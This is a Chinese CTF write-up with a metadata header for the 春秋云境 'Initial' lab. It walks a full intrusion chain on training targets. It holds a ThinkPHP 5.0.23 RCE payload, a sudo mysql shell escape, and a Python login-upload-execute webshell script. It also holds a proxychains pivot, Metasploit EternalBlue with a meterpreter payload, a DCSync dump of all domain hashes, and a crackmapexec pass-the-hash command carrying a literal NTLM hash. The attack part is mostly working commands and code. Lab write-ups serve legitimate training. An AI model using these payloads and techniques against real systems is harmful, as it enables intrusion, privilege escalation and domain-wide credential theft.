---
title: 春秋云境仿真场景WP：Initial
contest: 春秋云境仿真场景
year: 2024
difficulty: easy
vuln_type: rce
tags:
- ThinkPHP 5.0.23
- sudo mysql提权
- frp代理
- MS17-010
- DCSync
- 内网渗透
attack_chain: ThinkPHP5.0.23 RCE→sudo mysql -e读flag1→frp代理→MS17-010打172.22.1.21→DCSync域管hash→crackmapexec读flag3
key_payload: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;sudo mysql -e '! cat /root/flag/flag01.txt';ms17_010_eternalblue
one_liner: 春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网
lesson: 入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控
quality: medium
full_path: 春秋云境仿真场景WP：Initial.full.md
meta_path: 春秋云境仿真场景WP：Initial.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋云境仿真场景WP：Initial。春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网。经验：入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控
category: web
subcategory: rce
tools_used:
- ThinkPHP
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/184189.html
reasoning_chain:
- 入口 39.99.x.x → 触发点：电源管理页 + 指纹 ThinkPHP
- 假设：ThinkPHP 5.0.23 RCE → 动作：构造 payload _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
- 观察：ls 输出确认代码执行 → 下一步：提权读 flag1
- sudo -l → 触发点：/usr/bin/mysql NOPASSWD → 动作：sudo mysql -e '! cat /root/flag/flag01.txt'
- 观察：拿到 flag1 → 假设：内网必有横向 → 动作：frp 代理
- 动作：fscan 扫 172.22.1.0/24 → 观察：172.22.1.21 MS17-010
- 动作：msf use exploit/windows/smb/ms17_010_eternalblue → 拿到 WIN7 shell
- DCSync 拿域管 hash → 动作：crackmapexec smb 172.22.11.2 -u administrator -H <hash>
- 观察：导出 flag3 → 完成
failed_attempts:
- 直接找 flag → 失败：flag 分布在多台机器，必须走完整横向
- 绕过 ThinkPHP RCE 直接 webshell → 失败：题目限制走 RCE 路线
key_observations:
- ThinkPHP 5.0.23 _method 构造 + filter[]+server[REQUEST_METHOD] 是固定 RCE 三件套
- sudo mysql -e '! cmd' 提权无需 root 密码
- crackmapexec 是 DCSync + PTH 的轻量化命令行替代
- 入门靶场固定三段式：web RCE → frp 代理 → MS17-010 → DCSync
prerequisites:
- ThinkPHP 5.0.23 RCE payload 构造
- sudo 提权（mysql -e '! cmd'）
- frp 内网代理
- MSF 永恒之蓝（MS17-010）
- impacket/crackmapexec DCSync 工具链
---
# 春秋云境仿真场景WP：Initial

> 原文: https://www.ctfiot.com/184189.html
> ID: 184189

点击蓝字 关注我们

免责声明

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。

欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】

#

企业简介

赛克艾威 – 网络安全解决方案提供商

       北京赛克艾威科技有限公司（简称：赛克艾威），成立于2016年9月，提供全面的安全解决方案和专业的技术服务，帮助客户保护数字资产和网络环境的安全。

安全评估|渗透测试|漏洞扫描|安全巡检

代码审计|钓鱼演练|应急响应|安全运维

重大时刻安保|企业安全培训

联系方式

电话｜010-86460828 

官网｜https://sechub.com.cn

关注我们

公众号：sechub安全

哔哩号：SecHub官方账号


```
sudo mysql -e '! find / -name flag*'
sudo mysql -e '! cat /root/flag/flag01.txt'
import requests

session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
 'rempass': '0',
 'jmpass': 'false',
 'device': '1625884034525',
 'ltype': '0',
 'adminuser': 'YWRtaW4=',
 'adminpass': 'YWRtaW4xMjM=',
 'yanzm': ''
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
vim/etc/proxychains4.conf
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
load kiwi

kiwi_cmd "lsadump::
dcsync /domain:
xiaorang.lab /all /csv" exit # 导出域内所有用户的信息(包括哈希值)
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type UsersAdministratorflagflag03.txt"
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]